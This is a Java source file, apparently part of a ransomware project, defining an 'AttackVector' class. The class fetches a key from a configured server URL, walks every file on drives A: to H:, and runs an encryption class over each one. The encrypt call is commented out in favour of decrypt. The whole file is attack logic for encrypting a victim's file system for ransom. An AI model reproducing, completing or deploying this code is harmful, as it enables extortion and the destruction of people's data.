package Agent.Attack;

import java.io.File;
import java.io.IOException;
import java.lang.reflect.InvocationTargetException;
import java.security.GeneralSecurityException;
import java.util.ArrayList;
import java.util.Collection;

import org.springframework.beans.factory.annotation.Value;

import Agent.EncryptionAlgo.CryptoInterface;

import Agent.entites.CryptoKey;
import Agent.exceptions.RansomwareException;
import Agent.services.KeyService;
import Agent.traversal.*;

public class AttackVector {
	@Value("${server.url.get}")
	private String urlgetKey;
	@Value("${server.url.buy}")
	private String urlboughtKey;

	// Return instance of the key algorithm class
	private Object getCryptClass(String className) throws ReflectiveOperationException {

		try {
			return Class.forName(className).getDeclaredConstructor().newInstance();
		} catch (InstantiationException e) {
			throw new InstantiationException();
		} catch (IllegalAccessException e) {
			throw new IllegalAccessException();
		} catch (IllegalArgumentException e) {
			throw new IllegalArgumentException(e.getCause());
		} catch (InvocationTargetException e) {
			throw new InvocationTargetException(e.getCause());
		} catch (NoSuchMethodException e) {
			throw new NoSuchMethodException();
		} catch (SecurityException e) {
			throw new SecurityException("security exception", e.getCause());
		} catch (ClassNotFoundException e) {
			throw new ClassNotFoundException("wrong class name!", e.getCause());
		}

	}

	// Check if specific directory is already found in the folder tree
	private boolean isVisitedFolder(File file, Collection<File> folderTree) {

		return folderTree.stream().parallel().anyMatch(t -> t.equals(file));
	}

	// Treverse the input directory (drivers) and encrypt all files in it
	private void traverseAndEncrypt(String inputDir, Collection<File> dirs, CryptoKey key, Traverse struct)
			throws RansomwareException, ReflectiveOperationException, GeneralSecurityException {

		struct.add(new File(inputDir));
		while (!(struct.isEmpty())) {
			/* get next file/directory */
			File current = struct.remove();

			File[] fileDirList = current.listFiles();

			if (fileDirList != null) {
				for (File file : fileDirList) {
					if (file.isDirectory()) {

						if (!(isVisitedFolder(file, dirs))) {
							dirs.add(file);
							struct.add(file);
						}

					} else if (file.isFile()) {

						try {
							CryptoInterface crypto = (CryptoInterface) getCryptClass(key.getAlgorithm());
							// crypto.encrypt(key.getKey(), file);
							crypto.decrypt(key.getKey(), file);
						} catch (RansomwareException e) {
							throw new RansomwareException(e.getCause());
						} catch (GeneralSecurityException e) {
							throw new GeneralSecurityException("crypto exception", e.getCause());
						}
						catch (ReflectiveOperationException e) {
							throw new ReflectiveOperationException("problem with class finding", e.getCause());
						}
					}
				}

			}
		}
	}

	public void encryptFileSystem()
			throws IOException, RansomwareException, ReflectiveOperationException, GeneralSecurityException {

		Traverse dfs = new DFS();
		Traverse bfs = new BFS();
		KeyService key = new KeyService();
		Collection<File> visitedFolders = new ArrayList<File>();
		for (char i = 'A'; i <= 'H'; i++) {
			try {
				traverseAndEncrypt(i + ":\\", visitedFolders, key.getKey(urlgetKey), bfs);
				// or
				traverseAndEncrypt(i + ":\\", visitedFolders, key.getKey(urlgetKey), dfs);
			} catch (RansomwareException e) {
				throw new RansomwareException("failed encrypting the whole file system - ransom exception",
						e.getCause());
			} catch (IOException e) {
				throw new IOException("no key entered - io excrption", e.getCause());
			} catch (ReflectiveOperationException e) {
				throw new ReflectiveOperationException("problem with the class finding", e.getCause());
			} catch (GeneralSecurityException e) {
				throw new GeneralSecurityException("security exception", e.getCause());
			}

		}
	}
}
